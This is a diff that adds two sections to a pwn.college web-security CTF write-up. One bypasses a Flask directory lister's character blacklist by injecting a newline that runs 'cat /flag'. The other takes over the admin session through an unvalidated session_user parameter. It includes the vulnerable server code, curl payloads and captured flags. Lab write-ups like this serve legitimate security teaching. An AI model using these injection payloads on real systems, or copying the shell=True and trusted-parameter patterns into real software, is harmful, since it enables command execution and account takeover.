@@ -183,7 +183,7 @@ ls -l /
 
 ### Command injection
 
-#### Semicolon `;`
+#### Semicolon (`;`)
 
 If we use the semicolon `;` character, it ends the current shell statement and begins a new shell statement.
 
@@ -600,3 +600,224 @@ hacker@web-security~cmdi-5:/$ curl "http://challenge.localhost:80/task?filepath=
 hacker@web-security~cmdi-5:/$ cat ~/flag
 pwn.college{8AaACXxDIVRIYtpf0DRFtffjDx6.ddjN1YDL4ITM0EzW}
 ```
+
+&nbsp;
+
+## CMDi 6
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import subprocess
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+
+@app.route("/adventure", methods=["GET"])
+def challenge():
+    arg = (
+        flask.request.args.get("directory-path", "/challenge")
+        .replace(";", "")
+        .replace("&", "")
+        .replace("|", "")
+        .replace(">", "")
+        .replace("<", "")
+        .replace("(", "")
+        .replace(")", "")
+        .replace("`", "")
+        .replace("$", "")
+    )
+    command = f"ls -l {arg}"
+
+    print(f"DEBUG: {command=}")
+    result = subprocess.run(
+        command,  # the command to run
+        shell=True,  # use the shell to run this command
+        stdout=subprocess.PIPE,  # capture the standard output
+        stderr=subprocess.STDOUT,  # 2>&1
+        encoding="latin",  # capture the resulting output as text
+    ).stdout
+
+    return f"""
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of {command}:</b><br>
+        <pre>{result}</pre>
+        </body></html>
+        """
+
+
+os.setuid(os.geteuid())
+os.environ["PATH"] = "/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"
+app.secret_key = os.urandom(8)
+app.config["SERVER_NAME"] = "challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+This challenge filters out most of the characters used in command injections.
+
+### Command injection
+#### New line (`\n`)
+
+If we use a new line character (`\n`), we can work our way around this challenge.
+
+```
+## Request:
+curl "http://challenge.localhost:80/adventure?directory-path=/\n cat /flag"
+
+## Resultant command:
+ls -l /
+cat /flag
+```
+
+```
+hacker@web-security~cmdi-6:/$ curl "http://challenge.localhost:80/adventure?directory-path=/%0A%20cat%20/flag"
+
+        <html><body>
+        Welcome to the dirlister service! Please choose a directory to list the files of:
+        <form action="/adventure"><input type=text name=directory-path><input type=submit value=Submit></form>
+        <hr>
+        <b>Output of ls -l /
+ cat /flag:</b><br>
+        <pre>total 64
+lrwxrwxrwx    1 root root    7 Apr  4 02:03 bin -> usr/bin
+drwxr-xr-x    2 root root 4096 Apr 15  2020 boot
+drwxr-xr-x    1 root root 4096 Jun 11 03:00 challenge
+drwxr-xr-x    6 root root  380 Jun 11 03:00 dev
+drwxr-xr-x    1 root root 4096 Jun 11 03:00 etc
+-r--------    1 root root   58 Jun 11 03:00 flag
+drwxr-xr-x    1 root root 4096 May  1 03:58 home
+lrwxrwxrwx    1 root root    7 Apr  4 02:03 lib -> usr/lib
+lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib32 -> usr/lib32
+lrwxrwxrwx    1 root root    9 Apr  4 02:03 lib64 -> usr/lib64
+lrwxrwxrwx    1 root root   10 Apr  4 02:03 libx32 -> usr/libx32
+drwxr-xr-x    2 root root 4096 Apr  4 02:03 media
+drwxr-xr-x    2 root root 4096 Apr  4 02:03 mnt
+drwxr-xr-x    1 root root   16 Oct 26  2024 nix
+drwxr-xr-x    1 root root 4096 May  1 03:58 opt
+dr-xr-xr-x 2327 root root    0 Jun 11 03:00 proc
+drwx------    1 root root 4096 May  1 03:58 root
+drwxr-xr-x    1 root root 4096 Jun 11 03:00 run
+lrwxrwxrwx    1 root root    8 Apr  4 02:03 sbin -> usr/sbin
+drwxr-xr-x    2 root root 4096 Apr  4 02:03 srv
+dr-xr-xr-x   13 root root    0 Dec 13 06:06 sys
+drwxrwxrwt    1 root root 4096 Jun 11 03:08 tmp
+drwxr-xr-x    1 root root 4096 May  1 03:44 usr
+drwxr-xr-x    1 root root 4096 May  1 03:43 var
+pwn.college{ICIJmqkqLzC2c3VHciM_lzRSA-S.dRzN1YDL4ITM0EzW}
+</pre>
+        </body></html>
+```
+
+&nbsp;
+
+## Authentication Bypass 1
+
+### Source code
+```py title="/challenge/server" showLineNumbers
+#!/opt/pwn.college/python
+
+import tempfile
+import sqlite3
+import flask
+import os
+
+app = flask.Flask(__name__)
+
+# Don't panic about this class. It simply implements a temporary database in which
+# this application can store data. You don't need to understand its internals, just
+# that it processes SQL queries using db.execute().
+class TemporaryDB:
+    def __init__(self):
+        self.db_file = tempfile.NamedTemporaryFile("x", suffix=".db")
+
+    def execute(self, sql, parameters=()):
+        connection = sqlite3.connect(self.db_file.name)
+        connection.row_factory = sqlite3.Row
+        cursor = connection.cursor()
+        result = cursor.execute(sql, parameters)
+        connection.commit()
+        return result
+
+db = TemporaryDB()
+# https://www.sqlite.org/lang_createtable.html
+db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [os.urandom(8)])
+# https://www.sqlite.org/lang_insert.html
+db.execute("""INSERT INTO users SELECT "guest" as username, "password" as password""")
+
+@app.route("/", methods=["POST"])
+def challenge_post():
+    username = flask.request.form.get("username")
+    password = flask.request.form.get("password")
+    if not username:
+        flask.abort(400, "Missing `username` form parameter")
+    if not password:
+        flask.abort(400, "Missing `password` form parameter")
+
+    # https://www.sqlite.org/lang_select.html
+    user = db.execute("SELECT rowid, * FROM users WHERE username = ? AND password = ?", (username, password)).fetchone()
+    if not user:
+        flask.abort(403, "Invalid username or password")
+
+    return flask.redirect(f"""{flask.request.path}?session_user={username}""")
+
+
+@app.route("/", methods=["GET"])
+def challenge_get():
+    if not (username := flask.request.args.get("session_user", None)):
+        page = "<html><body>Welcome to the login service! Please log in as admin to get the flag."
+    else:
+        page = f"<html><body>Hello, {username}!"
+        if username == "admin":
+            page += "<br>Here is your flag: " + open("/flag").read()
+
+    return page + """
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
+        </form>
+        </body></html>
+    """
+
+app.secret_key = os.urandom(8)
+app.config['SERVER_NAME'] = f"challenge.localhost:80"
+app.run("challenge.localhost", 80)
+```
+
+This challenge checks if we have provided the correct credentials for the `admin` user.
+After successful login, the app redirects with:
+
+```py title="/challenge/server" showLineNumbers
+return redirect(f"/?session_user={username}")
+```
+
+Then in the GET route, it uses:
+
+```py title="/challenge/server" showLineNumbers
+username = request.args.get("session_user")
+if username == "admin":
+    show_flag()
+```
+
+This blindly trusts the user-controlled session_user parameter with no validation.
+This insecure session handling causes IDOR.
+
+#### IDOR
+
+```
+hacker@web-security~authentication-bypass-1:/$ curl "challenge.localhost:80/?session_user=admin"
+<html><body>Hello, admin!<br>Here is your flag: pwn.college{gDnBe8GKyI_E8AT1QYRMzHDq2Fy.dlDOzMDL4ITM0EzW}
+
+        <hr>
+        <form method=post>
+        User:<input type=text name=username>Pass:<input type=text name=password><input type=submit value=Submit>
+        </form>
+        </body></html>
+```
+
+&nbsp;
